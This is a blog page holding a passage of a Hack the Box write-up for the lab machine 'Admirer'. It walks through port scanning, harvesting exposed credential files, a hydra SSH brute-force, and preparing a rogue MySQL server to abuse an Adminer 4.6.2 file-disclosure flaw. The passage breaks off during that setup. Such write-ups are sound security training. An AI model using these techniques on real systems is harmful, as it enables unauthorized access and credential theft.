<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Admirer Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s write-up on the easy difficulty Linux machine ‘Admirer’ from https://hackthebox.eu." /><meta property="og:description" content="Zweilosec’s write-up on the easy difficulty Linux machine ‘Admirer’ from https://hackthebox.eu." /><link rel="canonical" href="https://zweilosec.github.io/posts/admirer/" /><meta property="og:url" content="https://zweilosec.github.io/posts/admirer/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/0-admirer-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-06T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/0-admirer-infocard.png" /><meta property="twitter:title" content="Hack the Box - Admirer Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2020-08-06T14:00:00+00:00","description":"Zweilosec’s write-up on the easy difficulty Linux machine ‘Admirer’ from https://hackthebox.eu.","headline":"Hack the Box - Admirer Writeup","image":"https://zweilosec.github.io/assets/img/0-admirer-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/admirer/"},"url":"https://zweilosec.github.io/posts/admirer/"}</script><title>Hack the Box - Admirer Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack the Box - Admirer Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Admirer Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Aug 6, 2020, 2:00 PM +0000" prep="on" > Aug 6, 2020 <i class="unloaded">2020-08-06T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4475 words">24 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---admirer">HTB - Admirer</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/0-admirer-infocard.png" alt="Informational data about the machine Admirer" /></p><p>An easy difficulty Linux machine that has an interesting take on database manipulation to obtain a local file inclusion vulnerability. It also has an interesting new (to me) way to leverage sudo privileges to gain privilege escalation. In all, this was a fun machine that taught me some interesting new tricks! This machine is on TJ_Null’s list of OSCP-like machines. Have fun!</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.187</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>zweilos@kali:~/htb/admirer$ nmap -p- -sCV -oA admirer 10.10.10.187
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 14:20 EDT
Nmap scan report for 10.10.10.187
Host is up (0.057s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)                                      
80/tcp open  http    Apache httpd 2.4.25 ((Debian))                                                   
| http-robots.txt: 1 disallowed entry                                                                 
|_/admin-dir                                                                                          
|_http-server-header: Apache/2.4.25 (Debian)                                                          
|_http-title: Admirer                                                                                  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                        
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .        
Nmap done: 1 IP address (1 host up) scanned in 51.54 seconds
</pre></table></code></div></div><p>Looking at the results of my nmap scan I saw that only ports 21 (FTP), 22 (SSH), and 80 (HTTP) were open.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>zweilos@kali:~/htb/admirer$ ftp 10.10.10.187                                                      
Connected to 10.10.10.187.                                                                           
220 (vsFTPd 3.0.3)                                                                                   
Name (10.10.10.187:zweilos): anonymous                                                               
530 Permission denied.                                                                               
Login failed.
</pre></table></code></div></div><p>I started out by trying to log into FTP, but it did not allow anonymous access.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-admirer-website.png" alt="Screenshot of the admirer website" /></p><p>Next, I opened a browser to see what was being hosted over HTTP and found a website of someone who was an “Admirer of skills and visuals”. There did not seem to be anything useful on the site itself.</p><h3 id="robotstxt">robots.txt</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-robots.txt.png" alt="The contents of robots.txt" /></p><p>Nmap pointed out that there was a <code class="language-plaintext highlighter-rouge">robots.txt</code> file, so I checked it out. I found a potential username <code class="language-plaintext highlighter-rouge">waldo</code> and also a folder <code class="language-plaintext highlighter-rouge">admin-dir</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/3-dirbuster.png" alt="The output of dirbuster showing useful files" /></p><p>Navigating directly to that page gave me an access forbidden error, so I fired up Dirbuster and ran it on this directory. This led me to a few useful sounding files: <code class="language-plaintext highlighter-rouge">contacts.txt</code> and <code class="language-plaintext highlighter-rouge">credentials.txt</code>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
</pre></table></code></div></div><p>The file <code class="language-plaintext highlighter-rouge">contacts.txt</code> contained some more potential usernames and a potentially useful email address format. I also noticed that <code class="language-plaintext highlighter-rouge">waldo</code> seemed to be a fan of The Big Bang Theory tv show, which could also be useful information.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">credentials.txt</code> contained credentials for a few services, so I added them to my <code class="language-plaintext highlighter-rouge">users</code> and <code class="language-plaintext highlighter-rouge">passwords</code> files.</p><h2 id="initial-foothold">Initial Foothold</h2><p>Next I used <code class="language-plaintext highlighter-rouge">hydra</code> to attempt a brute-force attack against SSH to see if any of the credentials would allow me to log in.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>zweilos@kali:~/htb/admirer$ hydra -L users -P passwords 10.10.10.187 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 15:40:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:10/p:3), ~2 tries per task
[DATA] attacking ssh://10.10.10.187:22/
[22][ssh] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 15:40:38
</pre></table></code></div></div><p>The FTP credentials seemed to also work for SSH! However, the connection was closed immediately upon logging in. After trying various ways to bypass this and failing, I moved on to try the credentials for FTP instead.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>zweilos@kali:~/htb/admirer$ ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:zweilos): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
</pre></table></code></div></div><p>Using the ftp credentials, I was able to log into the FTP server. I found a few interesting files and exfiltrated them back to my machine for analysis.</p><h3 id="the-database-backup">The database backup</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4.1-database.png" alt="Image showing the database dump.sql" /></p><p>The file <code class="language-plaintext highlighter-rouge">dump.sql</code> contained a dump of the website database. Unfortunately, it seemed as if the only useful information was the server version information and the database name and the name of a deleted table that looked to contain website files. I thought that this information could come in handy so I made note of it.</p><ul><li><strong>Database:</strong> admirerdb<li><strong>Table</strong>: items (deleted)<li><strong>Version</strong>: MySQL dump 10.16 Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4.1-database2.png" alt="Image of the Employees table in the database" /></p><p>The <code class="language-plaintext highlighter-rouge">Employees3</code> table had another list of potential usernames and email addresses that I added to my lists.</p><h3 id="back-end-code-backup">Back-end code backup</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4.2-html.png" alt="Zipped backup of the HTML code" /></p><p>After fully checking out the database, I moved on to the file <code class="language-plaintext highlighter-rouge">html.tar.gz</code>. I decompressed the tar file with <code class="language-plaintext highlighter-rouge">gunzip</code> and found that it contained a backup of the website’s back-end code, including a very interesting PHP file called <code class="language-plaintext highlighter-rouge">admin_tasks.php</code> in the <code class="language-plaintext highlighter-rouge">/utility-scripts/</code> folder.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4.5-admintasks.png" alt="Admin tasks backdoor" /></p><p>This file looked like a nice little backdoor that the admin had left for me called the “Admin Tasks Web Interface (v0.01 beta)”. I was very interested in options 4 through 7, which could potentially give me very sensitive system information.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4.6-db_admin.png" alt="PHP file containing waldo user credentials" /></p><p>in the same folder was <code class="language-plaintext highlighter-rouge">db_admin.php</code> which contained another set of credentials, this time for the user <code class="language-plaintext highlighter-rouge">waldo</code> who I had seen in the <code class="language-plaintext highlighter-rouge">robots.txt</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4.7-indexphp.png" alt="Another password for Waldo in the index.php file" /></p><p>There was also another password for <code class="language-plaintext highlighter-rouge">waldo</code> in the <code class="language-plaintext highlighter-rouge">index.php</code> file. This also referenced the <code class="language-plaintext highlighter-rouge">items</code> table that had been deleted from the database I exfiltrated. If I could get a web shell into this table, the page would run it for me when the page loaded.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>User-agent: *

# This folder contains personal stuff, so no one (not even robots!) should see it - waldo
Disallow: /w4ld0s_s3cr3t_d1r
</pre></table></code></div></div><p>Inside this HTML backup was a different version of the <code class="language-plaintext highlighter-rouge">robots.txt</code>. This time the disallowed folder was called <code class="language-plaintext highlighter-rouge">/w4ld0s_s3cr3t_d1r/</code>, which I had access to as a folder in the backup. This folder contained the files <code class="language-plaintext highlighter-rouge">contacts.txt</code> and <code class="language-plaintext highlighter-rouge">credentials.txt</code> which appeared at first to be the same as before.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">credentials.txt</code> had most of the same information as before, but <code class="language-plaintext highlighter-rouge">waldo</code> seemed to have left his bank account password in this one. Despite finding a couple more passwords, none of these worked for logging into SSH for any user.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4-admin-tasks.png" alt="Website for running administrative tasks on the server" /></p><p>I navigated to <code class="language-plaintext highlighter-rouge">http://10.10.10.187/utility-scripts/admin_tasks.php</code> which brought me to a website for running administrative tasks on the server.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4.9-admin-tasks.png" alt="Admin tasks is running as the user www-data" /></p><p>I didn’t find much useful other than the fact that the page was running in the context of the <code class="language-plaintext highlighter-rouge">www-data</code> user.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4.8-admin-tasks.png" alt="Disable script with insuficient privileges" /></p><p>I tried to run the disabled scripts, which gave the message: <code class="language-plaintext highlighter-rouge">Insufficient privileges to perform the selected operation.</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/5-adminer.png" alt="Adminer database management portal" /></p><p>After I checked back on my Dirbuster scan of the <code class="language-plaintext highlighter-rouge">/utility-scripts/</code> folder, I noticed it had found a new page <code class="language-plaintext highlighter-rouge">adminer.php</code> where I found an adminer database management portal.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/6-adminer.png" alt="I found the adminer version" /></p><p>I noticed the version was 4.6.2, though the page said right next to it that there was a version 4.7.7 available to download. A search for adminer 4.6.2 exploit brought me to <a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</a>. This led to <a href="https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw">https://sansec.io/research/sites-hacked-via-mysql-protocal-flaw</a>, which in turn linked to a MySQL exploit on GitHub at <a href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py">https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a>. I also found a few other references that gave a pretty clear picture of how to exploit this particular web SQL management portal.</p><ul><li><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a><li><a href="https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f">https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f</a></ul><p>To sum all of this up, the easiest way to exploit this portal is to set up a local MySQL database and have the remote server connect to it. I found instructions for how to do this at <a href="https://www.microfocus.com/documentation/idol/IDOL_12_0/MediaServer/Guides/html/English/Content/Getting_Started/Configure/_TRN_Set_up_MySQL_Linux.htm">https://www.microfocus.com/documentation/idol/IDOL_12_0/MediaServer/Guides/html/English/Content/Getting_Started/Configure/_TRN_Set_up_MySQL_Linux.htm</a></p><h2 id="road-to-user">Road to User</h2><h3 id="the-rogue-mysql-server">The rogue MySQL server</h3><p>I did a bit more research to figure out exactly how to set up the MySQL database. The following articles gave me the last bits of information I didn’t already know (specifically, how to create a user and assign it permissions).</p><ul><li><a href="https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/">https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/</a><li><a href="https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/">https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/</a></ul><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="n">zweilos</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">conf</span><span class="p">.</span><span class="n">d</span><span class="err">$</span> <span class="n">service</span> <span class="n">mysql</span> <span class="k">start</span>
<span class="n">zweilos</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">conf</span><span class="p">.</span><span class="n">d</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">su</span> <span class="o">-</span>
<span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~#</span> <span class="n">mysql</span>
<span class="n">Welcome</span> <span class="k">to</span> <span class="n">the</span> <span class="n">MariaDB</span> <span class="n">monitor</span><span class="p">.</span>  <span class="n">Commands</span> <span class="k">end</span> <span class="k">with</span> <span class="p">;</span> <span class="k">or</span> <span class="err">\</span><span class="k">g</span><span class="p">.</span>
<span class="n">Your</span> <span class="n">MariaDB</span> <span class="k">connection</span> <span class="n">id</span> <span class="k">is</span> <span class="mi">52</span>
<span class="n">Server</span> <span class="k">version</span><span class="p">:</span> <span class="mi">10</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">23</span><span class="o">-</span><span class="n">MariaDB</span><span class="o">-</span><span class="mi">1</span> <span class="n">Debian</span> <span class="n">buildd</span><span class="o">-</span><span class="n">unstable</span>

<span class="n">Copyright</span> <span class="p">(</span><span class="k">c</span><span class="p">)</span> <span class="mi">2000</span><span class="p">,</span> <span class="mi">2018</span><span class="p">,</span> <span class="n">Oracle</span><span class="p">,</span> <span class="n">MariaDB</span> <span class="n">Corporation</span> <span class="n">Ab</span> <span class="k">and</span> <span class="n">others</span><span class="p">.</span>

<span class="k">Type</span> <span class="s1">'help;'</span> <span class="k">or</span> <span class="s1">'</span><span class="se">\h</span><span class="s1">'</span> <span class="k">for</span> <span class="n">help</span><span class="p">.</span> <span class="k">Type</span> <span class="s1">'</span><span class="se">\c</span><span class="s1">'</span> <span class="k">to</span> <span class="n">clear</span> <span class="n">the</span> <span class="k">current</span> <span class="k">input</span> <span class="k">statement</span><span class="p">.</span>

<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">database</span> <span class="n">admirer</span>
    <span class="o">-&gt;</span> <span class="nb">CHARACTER</span> <span class="k">SET</span> <span class="n">utf8</span> <span class="k">COLLATE</span> <span class="n">utf8_unicode_ci</span><span class="p">;</span>
